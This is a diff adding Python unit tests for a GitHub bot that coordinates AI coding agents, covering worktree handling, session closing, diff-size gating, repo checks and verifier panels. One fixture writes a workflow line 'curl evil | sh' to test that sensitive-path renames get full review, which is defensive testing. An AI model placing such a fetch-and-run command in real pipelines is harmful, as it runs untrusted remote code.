@@ -1,8 +1,11 @@
-"""Tests for bot.py's pure decisions: JSON parsing, triggers, PR ownership, the merge gate.
+"""Tests for bot.py's decisions (JSON parsing, triggers, PR ownership, the merge gate) and its worktree handling.
 
     python test_bot.py
 """
 import json
+import os
+import shutil
+import subprocess
 import tempfile
 import unittest
 from pathlib import Path
@@ -658,6 +661,370 @@ class SealedIssueTest(unittest.TestCase):
         self.assertEqual(status, "not-discussed")
         c.it.ask.assert_not_called()
         c.it.ask_sealed.assert_not_called()
+
+
+def sh(cwd, *args) -> str:
+    return subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True, text=True).stdout.strip()
+
+
+@unittest.skipIf(shutil.which("git") is None, "needs git")
+class WorktreeBranchTest(unittest.TestCase):
+    """worktree_at with -B on a branch another worktree holds (issue #27): bot-owned holders are detached."""
+
+    def setUp(self):
+        tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(tmp.cleanup)
+        self.tmp = Path(tmp.name)
+        self.work = self.tmp / "cache"
+        self.clone = self.work / "repos" / "r"
+        self.clone.mkdir(parents=True)
+        sh(self.clone, "init", "-q")
+        sh(self.clone, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "c0")
+        for patch in (mock.patch.object(bot, "WORK", self.work), mock.patch.object(bot, "log")):
+            patch.start()
+            self.addCleanup(patch.stop)
+        self.trees = self.work / "worktrees" / "r"
+
+    def holders(self):
+        return [bot.norm_path(p) for p in bot.worktree_holders(self.clone, "b")]
+
+    def held_impl(self, dirty=True):
+        impl = bot.worktree_at(self.clone, self.trees / "issue5-impl", "HEAD", branch="b")
+        if dirty:
+            (impl / "wip.txt").write_text("uncommitted", encoding="utf-8")
+        return impl
+
+    def assert_detached_keeping_work(self, tree):
+        self.assertEqual(sh(tree, "rev-parse", "--abbrev-ref", "HEAD"), "HEAD")
+        self.assertEqual((tree / "wip.txt").read_text(encoding="utf-8"), "uncommitted")
+
+    def test_new_destination_takes_branch_from_bot_tree(self):
+        impl = self.held_impl()
+        author = bot.worktree_at(self.clone, self.trees / "pr6-author", "HEAD", branch="b")
+        self.assertEqual(self.holders(), [bot.norm_path(author)])
+        self.assert_detached_keeping_work(impl)
+
+    def test_existing_destination_takes_branch_from_bot_tree(self):
+        author = bot.worktree_at(self.clone, self.trees / "pr6-author", "HEAD")  # exists, so checkout -B runs
+        impl = self.held_impl()
+        bot.worktree_at(self.clone, author, "HEAD", branch="b")
+        self.assertEqual(self.holders(), [bot.norm_path(author)])
+        self.assert_detached_keeping_work(impl)
+
+    def test_holder_outside_bot_worktrees_is_left_alone(self):
+        for outside in (self.tmp / "user-tree", self.work / "worktrees2" / "r" / "x"):
+            with self.subTest(outside.name):
+                sh(self.clone, "worktree", "add", "-q", "-B", "b", str(outside), "HEAD")
+                with self.assertRaises(RuntimeError) as err:
+                    bot.worktree_at(self.clone, self.trees / "pr6-author", "HEAD", branch="b")
+                self.assertIn(str(outside), str(err.exception))
+                self.assertEqual(self.holders(), [bot.norm_path(outside)])
+                sh(self.clone, "worktree", "remove", "--force", str(outside))
+
+    def test_failed_detach_raises_naming_holder(self):
+        impl = self.held_impl(dirty=False)
+        real = bot.run
+
+        def run(cmd, *a, **kw):
+            if list(cmd[1:3]) == ["checkout", "--detach"]:
+                return subprocess.CompletedProcess(cmd, 1, "", "locked")
+            return real(cmd, *a, **kw)
+
+        with mock.patch.object(bot, "run", run), self.assertRaises(RuntimeError) as err:
+            bot.worktree_at(self.clone, self.trees / "pr6-author", "HEAD", branch="b")
+        self.assertIn(str(impl), str(err.exception))
+        self.assertIn("locked", str(err.exception))
+        self.assertEqual(self.holders(), [bot.norm_path(impl)])
+
+
+class SessionCloseTest(unittest.TestCase):
+    def test_close_uses_each_sessions_agent_model_and_cwd(self):
+        with tempfile.TemporaryDirectory() as tmp, mock.patch.object(bot, "WORK", Path(tmp)), \
+                mock.patch.object(bot, "log") as log, mock.patch.object(bot.shutil, "which", return_value="acpx"), \
+                mock.patch.object(bot, "known_agents", return_value={"a", "c"}), \
+                mock.patch.object(bot, "run", return_value=subprocess.CompletedProcess([], 0, "ok", "")) as run:
+            it = bot.Item(mock.Mock(), "o/r", "issue", 5)
+            it.ask({"agent": "a", "model": "m"}, "p", Path("t1"), "--approve-all", "s1")
+            it.ask({"agent": "c"}, "p", Path("t2"), "--approve-reads", "s2")
+            it.ask({"agent": "a"}, "p", Path("t3"), "--approve-reads", "kept")
+            run.reset_mock()
+            run.side_effect = [subprocess.CompletedProcess([], 0, "", ""), RuntimeError("boom")]
+            it.close_sessions(["s1", "s2"])  # a failed close is logged, never raised
+        self.assertEqual([[str(c) for c in call.args[0]] for call in run.call_args_list],
+                         [["acpx", "--cwd", "t1", "--model", "m", "a", "sessions", "close", "s1"],
+                          ["acpx", "--cwd", "t2", "c", "sessions", "close", "s2"]])
+        self.assertIn("boom", log.call_args.args[0])
+
+
+class ImplementReleaseTest(unittest.TestCase):
+    SESSIONS = ("t-build-x-author", "t-build-x-reviewer", "t-build-x-implement")
+
+    def implement(self, commits="1", close=None):
+        c = object.__new__(bot.IssueConversation)
+        c.repo, c.n, c.default, c.item = "o/r", 5, "main", {}
+        c.clone, c.tree, c.author, c.reviewer = Path("clone"), Path("w/issue5"), {"agent": "a"}, {"agent": "a"}
+        c.issue = {"title": "t", "body": "b", "author": {"login": OWNER}}
+        c.bot, c.it = mock.Mock(), mock.Mock()
+        c.it.ask.return_value = "done"
+        if close:
+            c.it.close_sessions.side_effect = close
+        git_out = {"rev-parse": "abc", "rev-list": commits}
+        with mock.patch.object(bot, "gh_json", return_value=[]), mock.patch.object(bot, "log"), \
+                mock.patch.object(bot, "worktree_at", return_value=Path("w/issue5-impl")), \
+                mock.patch.object(bot, "gh", return_value="https://github.com/o/r/pull/6"), \
+                mock.patch.object(bot, "git", side_effect=lambda cwd, *a, **kw: git_out.get(a[0], "")), \
+                mock.patch.object(bot, "run", side_effect=lambda cmd, **kw: subprocess.CompletedProcess(
+                    cmd, 1 if "--verify" in cmd else 0, "", "")) as run:
+            status = c.implement("plan", self.SESSIONS)
+        detaches = [call.kwargs.get("cwd") for call in run.call_args_list if call.args[0][1:3] == ["checkout", "--detach"]]
+        return status, c.it.close_sessions, detaches
+
+    def test_opened_pr_closes_build_sessions_then_detaches_impl_tree(self):
+        status, close, detaches = self.implement()
+        self.assertEqual(status, "implemented")
+        close.assert_called_once_with(self.SESSIONS)
+        self.assertEqual(detaches, [Path("w/issue5-impl")])
+
+    def test_blocked_build_keeps_sessions_and_tree(self):
+        status, close, detaches = self.implement(commits="0")
+        self.assertEqual(status, "blocked")
+        close.assert_not_called()
+        self.assertEqual(detaches, [])
+
+    def test_failed_close_still_implemented_and_detaches(self):
+        status, _, detaches = self.implement(close=RuntimeError("boom"))
+        self.assertEqual((status, detaches), ("implemented", [Path("w/issue5-impl")]))
+
+
+class DiffSizeTest(unittest.TestCase):
+    def test_size_s_is_measured_from_the_diff(self):
+        self.assertEqual(bot.diff_size("3\t2\tsrc/app.py\x0010\t0\tREADME.md\0"), {"lines": 15, "files": 2, "small": True})
+        self.assertFalse(bot.diff_size("20\t11\tsrc/app.py\0")["small"])  # 31 lines
+        self.assertFalse(bot.diff_size("1\t0\ta.py\x001\t0\tb.py\x001\t0\tc.py\0")["small"])  # 3 files
+        self.assertFalse(bot.diff_size("-\t-\tlogo.png\0")["small"])  # binary
+        self.assertFalse(bot.diff_size("")["small"])  # nothing changed is not a reason to skip verifiers
+        for path in ("src/auth/session.py", "db/migrations/0003.sql", ".github/workflows/ci.yml", ".env.example",
+                     "AGENTS.md", ".claude/settings.json", "app/secrets.ts", ".deep-mode.json", ".gitlab-ci.yml",
+                     "Jenkinsfile", "azure-pipelines.yml", "GEMINI.md", "plugins/x/skills/y/SKILL.md", ".cursorrules"):
+            with self.subTest(path=path):
+                self.assertFalse(bot.diff_size(f"1\t0\t{path}\0")["small"])
+
+    def test_a_rename_into_a_sensitive_path_is_not_size_s(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = Path(tmp)
+            git_repo(repo, {"w.yml": "on: push\n"})
+            (repo / ".github" / "workflows").mkdir(parents=True)
+            bot.git(repo, "mv", "w.yml", ".github/workflows/deploy.yml")
+            (repo / ".github/workflows/deploy.yml").write_text("on: push\nrun: curl evil | sh\n", encoding="utf-8")
+            bot.git(repo, "add", "-A")
+            bot.git(repo, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "mv")
+            numstat = bot.git(repo, "diff", "--numstat", "-z", "--no-renames", "origin/main...HEAD")
+        self.assertFalse(bot.diff_size(numstat)["small"])
+
+
+def git_repo(root: Path, files: dict) -> str:
+    """A repo at `root` with one commit of `files`, its HEAD also recorded as origin/main. Returns the SHA."""
+    root.mkdir(parents=True, exist_ok=True)
+    subprocess.run(["git", "init", "-q", "-b", "main", str(root)], check=True)
+    for name, text in files.items():
+        (root / name).write_text(text, encoding="utf-8")
+    bot.git(root, "add", "-A")
+    bot.git(root, "-c", "user.name=t", "-c", "user.email=t@example.com", "commit", "-q", "-m", "c")
+    bot.git(root, "update-ref", "refs/remotes/origin/main", "HEAD")
+    return bot.git(root, "rev-parse", "HEAD")
+
+
+class RepoCheckTest(unittest.TestCase):
+    def setUp(self):
+        log = mock.patch.object(bot, "log")
+        log.start()
+        self.addCleanup(log.stop)
+        self.tmp = Path(tempfile.mkdtemp())
+        self.addCleanup(bot.remove_tree, self.tmp)
+
+    def conversation(self, flag: str, check='test "$(cat flag.txt)" = ok'):
+        config = json.dumps({"check": check}) if check else "{}"
+        sha = git_repo(self.tmp / "clone", {".deep-mode.json": config, "flag.txt": flag})
+        c = object.__new__(bot.PRConversation)
+        c.clone, c.check_tree, c.base, c.head, c.n, c.item = self.tmp / "clone", self.tmp / "check", "main", sha, 7, {}
+        c.it = FakeItem("")
+        c.it.key = "o/r#pr:7"
+        c.require_own = mock.Mock()
+        return c, sha
+
+    def test_a_passing_check_gives_no_finding_and_is_remembered_for_the_merge(self):
+        c, sha = self.conversation("ok")
+        self.assertEqual(c.check_findings(), [])
+        self.assertEqual(c.item["repoCheck"], {"sha": sha, "code": 0, "command": 'test "$(cat flag.txt)" = ok'})
+
+    def test_a_failing_check_goes_to_the_author_as_a_p1_finding(self):
+        c, sha = self.conversation("broken")
+        findings = c.check_findings()
+        self.assertEqual([(f["id"], f["severity"]) for f in findings], [("C1", "P1")])
+        self.assertIn("exited 1", findings[0]["claim"])
+        self.assertIn("exited 1", c.it.posts[0][1])
+
+    def test_no_check_configured_runs_nothing(self):
+        c, _ = self.conversation("broken", check=None)
+        self.assertIsNone(c.repo_check(c.head))
+        self.assertEqual(c.check_findings(), [])
+
+    def test_the_check_never_runs_on_a_head_someone_else_pushed(self):
+        c, _ = self.conversation("ok")
+        c.require_own = mock.Mock(side_effect=bot.Blocked("not own"))
+        with mock.patch.object(c, "repo_check") as check, self.assertRaises(bot.Blocked):
+            c.check_findings()
+        check.assert_not_called()
+
+    def test_a_pass_with_an_older_check_command_is_run_again_before_the_merge(self):
+        c, sha = self.conversation("broken")
+        c.item = {"panelSha": sha, "repoCheck": {"sha": sha, "code": 0, "command": "true"}}  # the base changed it
+        c.gate_facts = mock.Mock(return_value=GateTest.facts(self, head=sha, panelSha=sha))
+        with mock.patch.object(bot, "merge_pr") as merge:
+            self.assertEqual(c.land("3/3"), "blocked")
+        merge.assert_not_called()
+
+    def test_the_merge_waits_for_a_passing_check_at_the_exact_head(self):
+        c, sha = self.conversation("broken")
+        c.item = {"panelSha": sha, "repoCheck": {"sha": "0" * 40, "code": 0, "command": 'test "$(cat flag.txt)" = ok'}}
+        c.gate_facts = mock.Mock(return_value=GateTest.facts(self, head=sha, panelSha=sha))
+        with mock.patch.object(bot, "merge_pr") as merge:
+            self.assertEqual(c.land("3/3"), "blocked")
+        merge.assert_not_called()
+        self.assertIn("Not merging: the repo check", c.it.posts[-1][1])
+
+    def test_the_trunk_check_runs_the_command_and_reverts_on_red(self):
+        c, sha = self.conversation("broken")
+        c.verifier_trees, c.cfg = [self.tmp / "v1"], {"verifiers": [{"agent": "v"}]}
+        c.revert_red = mock.Mock(return_value="merged-reverting")
+        with mock.patch.object(bot, "git", side_effect=lambda *a, **kw: "" if "fetch" in a else bot.run(
+                ["git", *a[1:]], cwd=a[0]).stdout.strip()):
+            self.assertEqual(c.trunk_check(sha), "merged-reverting")
+        self.assertEqual(c.it.asked, [])  # no agent: the command decided
+        self.assertIn("exited 1", c.revert_red.call_args.args[1])
+
+
+class LightPanelTest(unittest.TestCase):
+    def setUp(self):
+        log = mock.patch.object(bot, "log")
+        log.start()
+        self.addCleanup(log.stop)
+
+    def panel(self, numstat, votes, labels=(), author=None, verifiers=None):
+        c = object.__new__(bot.PRConversation)
+        c.head, c.base, c.n, c.repo, c.clone, c.item = "s" * 40, "main", 7, "o/r", Path("clone"), {}
+        c.pr = {"title": "t", "body": "", "labels": labels}
+        c.author = author or {"agent": "omp"}
+        c.cfg = {"verifiers": verifiers or [{"agent": "omp"}, {"agent": "omp", "model": "other/one"},
+                                           {"agent": "omp", "model": "x/y"}]}
+        c.verifier_trees = [Path(f"v{i}") for i in range(3)]
+        c.require_own = mock.Mock()
+        c.it = mock.Mock()
+        c.it.ask.side_effect = [f'ok\n```json\n{{"vote":"{v}","evidence":"ran it"}}\n```' for v in votes]
+        with mock.patch.object(bot, "git", side_effect=lambda clone, *a: numstat if "--numstat" in a else "stat"), \
+                mock.patch.object(bot, "worktree_at"):
+            return c.panel(), c
+
+    def test_a_size_s_diff_gets_one_verifier_from_another_model(self):
+        (passed, tally, _), c = self.panel("2\t1\tsrc/app.py\0", ["PASS"])
+        self.assertEqual((passed, tally), (True, "1/1"))
+        self.assertEqual(c.it.ask.call_count, 1)
+        self.assertEqual(c.it.ask.call_args.args[0], {"agent": "omp", "model": "other/one"})
+        self.assertEqual(c.it.ask.call_args.args[2], Path("v1"))
+        self.assertIn("Light panel (size S", c.it.say.call_args.args[3])
+
+    def test_the_one_light_verifier_must_pass(self):
+        (passed, _, failures), _ = self.panel("2\t1\tsrc/app.py\0", ["FAIL"])
+        self.assertFalse(passed)
+        self.assertEqual(len(failures), 1)
+
+    def test_a_larger_diff_gets_the_full_panel(self):
+        (passed, tally, _), c = self.panel("40\t0\tsrc/app.py\0", ["PASS", "PASS", "FAIL"])
+        self.assertEqual((passed, tally), (True, "2/3"))
+        self.assertEqual(c.it.ask.call_count, 3)
+
+    def test_the_full_panel_label_overrides_size_s(self):
+        (_, tally, _), c = self.panel("2\t1\tsrc/parse.py\0", ["PASS", "PASS", "PASS"], labels=[{"name": "full-panel"}])
+        self.assertEqual((tally, c.it.ask.call_count), ("3/3", 3))
+
+    def test_the_light_verifier_prefers_another_agent_over_another_model(self):
+        verifiers = [{"agent": "claude"}, {"agent": "claude", "model": "m2"}, {"agent": "codex"}]
+        _, c = self.panel("2\t1\tsrc/app.py\0", ["PASS"], author={"agent": "claude"}, verifiers=verifiers)
+        self.assertEqual(c.it.ask.call_args.args[0], {"agent": "codex"})
+
+
+def link_dir(link: Path, target: Path) -> bool:
+    """A directory link like the one omp makes in plugins/node_modules: a symlink, or a junction on Windows."""
+    try:
+        os.symlink(target, link, target_is_directory=True)
+        return True
+    except OSError:
+        return os.name == "nt" and subprocess.run(["cmd", "/c", "mklink", "/J", str(link), str(target)],
+                                                  capture_output=True).returncode == 0
+
+
+class AutostartPathTest(unittest.TestCase):
+    def test_an_omp_plugin_install_autostarts_through_the_stable_link(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            home = Path(tmp)
+            root = home / ".omp/plugins/cache/plugins/deep-mode___deep-mode___0.6.0"
+            script = root / "skills/deep-mode/assets/github-app/bot.py"
+            script.parent.mkdir(parents=True)
+            script.write_text("", encoding="utf-8")
+            (home / ".omp/plugins/node_modules").mkdir(parents=True)
+            link = home / ".omp/plugins/node_modules/deep-mode"
+            if not link_dir(link, root):
+                self.skipTest("cannot make a directory link here")
+            with mock.patch.object(bot, "__file__", str(script)), mock.patch.object(Path, "home", return_value=home):
+                self.assertEqual(bot.stable_script(), link / "skills/deep-mode/assets/github-app/bot.py")
+                link.rmdir() if os.name == "nt" else link.unlink()  # not installed through omp: the real path
+                self.assertEqual(bot.stable_script(), script.resolve())
+
+
+class ParallelReposTest(unittest.TestCase):
+    def test_one_slow_repo_does_not_hold_up_the_others(self):
+        b = object.__new__(bot.Bot)
+        b.dry, b.state = True, {"since": "2026-01-01T00:00:00Z", "items": {}}
+        b.args = mock.Mock(repo=None, backlog=False)
+        b.cfg = {"parallelRepos": 4}
+        b.ident = mock.Mock(repos=mock.Mock(return_value=["o/slow", "o/fast"]))
+        b.ident.describe.return_value = "test"
+        finished = []
+
+        def repo_cycle(repo, since):
+            self.assertTrue(bot._holding.big)  # every worker runs its Python under the state lock
+            b.state["items"][repo] = "seen"
+            bot.pause(0.6 if repo == "o/slow" else 0)  # waiting lets go of the lock
+            finished.append(repo)
+
+        b.repo_cycle = repo_cycle
+        with mock.patch.object(bot, "log"):
+            b.cycle()
+        self.assertEqual(finished, ["o/fast", "o/slow"])
+        self.assertEqual(set(b.state["items"]), {"o/slow", "o/fast"})
+        self.assertFalse(bot.BIG.locked())
+
+    def test_stop_ends_each_worker_at_its_next_blocking_call(self):
+        b = object.__new__(bot.Bot)
+        b.dry, b.state = True, {"since": "2026-01-01T00:00:00Z", "items": {}}
+        b.args, b.cfg = mock.Mock(repo=None, backlog=False), {"parallelRepos": 2}
+        b.ident = mock.Mock(repos=mock.Mock(return_value=["o/a", "o/b"]))
+        b.ident.describe.return_value = "test"
+        done = []
+
+        def repo_cycle(repo, since):
+            for item in range(4):
+                bot.pause(0.2)
+                if repo == "o/a" and item == 0:
+                    bot.STOP.set()  # what Ctrl-C sets
+                done.append((repo, item))
+
+        b.repo_cycle = repo_cycle
+        self.addCleanup(bot.STOP.clear)
+        with mock.patch.object(bot, "log"):
+            b.cycle()
+        self.assertLess(len(done), 4)  # neither worker went on through its items
+        self.assertFalse(bot.BIG.locked())
 
 
 class TextTest(unittest.TestCase):
